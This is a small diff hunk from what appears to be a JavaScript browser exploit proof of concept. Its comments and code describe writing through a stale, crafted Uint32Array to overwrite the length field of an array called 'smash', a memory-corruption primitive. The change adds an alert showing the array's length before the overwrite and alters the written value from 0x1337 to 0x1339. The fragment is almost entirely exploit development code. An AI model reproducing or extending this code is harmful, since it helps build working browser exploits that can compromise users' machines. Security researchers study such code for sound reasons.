@@ -182,7 +182,8 @@
 
                                     // write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array
                                     // which should point to the struct of smash, allowing us to overwrite the length of smash
-                                    stale[0][6] = 0x1337;
+                                    alert('smash.length is: 0x'+smash.length.toString(16));
+                                    stale[0][6] = 0x1339;
 
                                     // check the length of smash is now.
                                     alert('smash.length is now: 0x'+smash.length.toString(16));
